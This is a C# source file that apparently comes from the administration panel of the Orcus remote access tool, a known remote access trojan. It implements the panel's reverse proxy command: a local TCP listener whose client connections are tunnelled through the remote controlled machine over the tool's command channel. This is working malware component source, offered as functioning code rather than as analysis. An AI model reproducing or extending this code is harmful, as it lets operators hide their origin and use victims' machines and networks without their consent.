using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.ReverseProxy;
using Orcus.Shared.NetSerializer;
using DisallowMultipleThreads = Orcus.Plugins.DisallowMultipleThreadsAttribute;

namespace Orcus.Administration.Commands.ReverseProxy
{
    [DisallowMultipleThreads]
    public class ReverseProxyCommand : Command
    {
        private Socket _socket;
        private List<ReverseProxyClient> _clients;
        private readonly object _clientsLock = new object();

        public override void Dispose()
        {
            base.Dispose();
            if (IsStarted)
                StopServer();
        }

        public event EventHandler<ReverseProxyClient> ClientAdded;
        public event EventHandler<ReverseProxyClient> ClientRemoved;

        public bool IsStarted { get; private set; }

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((ReverseProxyCommunication) parameter[0])
            {
                case ReverseProxyCommunication.ResponseStatusUpdate:
                    if (_clients == null)
                        return;

                    var statusUpdate = Serializer.FastDeserialize<ReverseProxyStatusUpdate>(parameter, 1);
                    var reverseProxyClient = GetReverseProxyClientById(statusUpdate.ConnectionId);
                    reverseProxyClient?.HandleCommandResponse(statusUpdate);
                    break;
                case ReverseProxyCommunication.ResponseData:
                    if (_clients == null)
                        return;

                    var connectionId = BitConverter.ToInt32(parameter, 1);
                    reverseProxyClient = GetReverseProxyClientById(connectionId);
                    reverseProxyClient?.SendToClient(parameter, 5, parameter.Length - 5);
                    break;
                case ReverseProxyCommunication.ResponseDisconnected:
                    if (_clients == null)
                        return;

                    connectionId = BitConverter.ToInt32(parameter, 1);
                    GetReverseProxyClientById(connectionId)?.Disconnect();
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void StartServer(string ipAddress, ushort port)
        {
            lock (_clientsLock)
                _clients = new List<ReverseProxyClient>();

            IsStarted = true;

            _socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            _socket.Bind(new IPEndPoint(IPAddress.Parse(ipAddress), port));
            _socket.Listen(100);
            _socket.BeginAccept(AsyncAccept, null);

            LogService.Info(string.Format((string) Application.Current.Resources["ReverseProxyStarted"],
                ipAddress + ":" + port));
        }

        public void StopServer()
        {
            if (_socket != null)
            {
                _socket.Close();
                _socket = null;
            }

            LogService.Info((string)Application.Current.Resources["SocketClosed"]);

            lock (_clientsLock)
            {
                for (int i = _clients.Count - 1; i > 0; i--)
                    _clients[i].Disconnect();
            }

            LogService.Info((string)Application.Current.Resources["ClientsDisconnected"]);

            IsStarted = false;
            LogService.Info((string)Application.Current.Resources["ReverseProxyStopped"]);
        }

        private ReverseProxyClient GetReverseProxyClientById(int connectionId)
        {
            lock (_clientsLock)
            {
                return _clients.FirstOrDefault(x => x.ConnectionId == connectionId);
            }
        }

        private void AsyncAccept(IAsyncResult ar)
        {
            try
            {
                var reverseProxyClient = new ReverseProxyClient(_socket.EndAccept(ar));
                reverseProxyClient.Connect += ReverseProxyClientOnConnect;
                reverseProxyClient.Disconnected += ReverseProxyClientOnDisconnected;
                reverseProxyClient.SendDataPacket += ReverseProxyClientOnSendDataPacket;

                lock (_clientsLock)
                    _clients.Add(reverseProxyClient);

                reverseProxyClient.Initialize();
                ClientAdded?.Invoke(this, reverseProxyClient);
            }
            catch
            {
                // ignored
            }

            try
            {
                _socket.BeginAccept(AsyncAccept, null);
            }
            catch
            {
                // Server stopped listening
            }
        }

        private void ReverseProxyClientOnSendDataPacket(object sender, byte[] bytes)
        {
            var connectionId = ((ReverseProxyClient) sender).ConnectionId;
            ConnectionInfo.UnsafeSendCommand(this, bytes.Length + 5, writer =>
            {
                writer.Write((byte) ReverseProxyCommunication.SendData);
                writer.Write(connectionId);
                writer.Write(bytes);
            });
        }

        private void ReverseProxyClientOnDisconnected(object sender, EventArgs eventArgs)
        {
            var reverseProxyClient = (ReverseProxyClient) sender;
            ConnectionInfo.UnsafeSendCommand(this, 5, writer =>
            {
                writer.Write((byte) ReverseProxyCommunication.Disconnect);
                writer.Write(reverseProxyClient.ConnectionId);
            });

            lock (_clientsLock)
                _clients.Remove(reverseProxyClient);

            ClientRemoved?.Invoke(this, reverseProxyClient);
        }

        private void ReverseProxyClientOnConnect(object sender, ReverseProxyConnect reverseProxyConnect)
        {
            var connectData = Serializer.FastSerialize(reverseProxyConnect);
            ConnectionInfo.UnsafeSendCommand(this, connectData.Length + 1, writer =>
            {
                writer.Write((byte) ReverseProxyCommunication.Connect);
                writer.Write(connectData);
            });
        }

        protected override uint GetId()
        {
            return 15;
        }
    }
}